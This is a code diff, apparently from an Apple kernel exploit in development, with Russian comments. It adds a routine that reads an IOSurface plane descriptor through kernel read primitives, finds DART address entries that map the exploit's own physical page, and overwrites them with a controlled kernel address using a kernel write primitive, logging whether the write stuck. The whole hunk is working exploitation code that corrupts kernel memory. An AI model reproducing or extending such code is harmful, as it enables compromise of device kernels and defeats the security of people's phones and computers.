@@ -7223,6 +7223,39 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
     }
+    // 1.9.236 (р.57): КРИТИЧЕСКАЯ ПОПРАВКА — +0x58 работает только для type-0x30;
+    // наши desc = type-0x10, DART PA идёт из addr64-записей spec'а (entries
+    // {addr64,len64} stride 0x10 @ getPhysicalSegment 0x86ea394). Патч по
+    // ВЛАДЕНИЮ, не по значению: запись, чей kvtophys(VA)==backingPA → ctlKVA
+    // (map отрезолвит её в ctlPA). desc = plane-desc [IOSurface+0x30] (Q1).
+    // [planeDesc+0x20] & 0xf0 — type-check для протокола.
+    {
+        uint64_t pdX = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint32_t dtype = (kpLooksLikeKernelPointer(pdX) && kpSafeToRead(pdX)) ? (uint32_t)(early_kread64(pdX + 0x20) & 0xf0) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [DSX] planeDesc=%#llx type(0x20&0xf0)=0x%x", (unsigned long long)pdX, dtype]);
+        uint64_t specX = (kpLooksLikeKernelPointer(pdX) && kpSafeToRead(pdX)) ? kp_untag_ptr(early_kread64(pdX + 0x60)) : 0;
+        if (kpLooksLikeKernelPointer(specX) && kpSafeToRead(specX) && ctlKVA) {
+            int nPatched = 0;
+            for (uint32_t o = 0; o + 16 <= 0x70; o += 0x10) {
+                uint64_t addr = early_kread64(specX + o);
+                uint64_t len = early_kread64(specX + o + 8);
+                uint64_t pa = kpLooksLikeKernelPointer(addr) ? kvtophys(addr) : 0;
+                kpNote(r, [NSString stringWithFormat:@"    dsx entry+%#x: addr=%#018llx len=%#llx → PA %#llx%@",
+                          o, (unsigned long long)addr, (unsigned long long)len, (unsigned long long)pa,
+                          pa == backingPA ? @" ← НАША" : @""]);
+                if (pa == backingPA && nPatched < 4) {
+                    kpNote(r, [NSString stringWithFormat:@"    dsx ★ addr-запись НАШЕЙ страницы +%#x: %#018llx → ctlKVA %#llx",
+                              o, (unsigned long long)addr, (unsigned long long)ctlKVA]);
+                    usleep(2000);
+                    early_kwrite64(specX + o, ctlKVA);
+                    uint64_t rb = early_kread64(specX + o);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    nPatched++;
+                }
+            }
+            if (!nPatched) kpNote(r, @"  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)");
+        }
+    }
     // 1.9.224: spec+0x58 ПОСЛЕ execute#1 — пре-execute дамп (1.9.223) показал
     // канарейки и random (+0x00=0): спек ЗАПОЛНЯЕТСЯ фабрикой при первом execute,
     // а не при create/submit. Патчить надо ТУТ (pfn уже на месте) — retry возьмёт
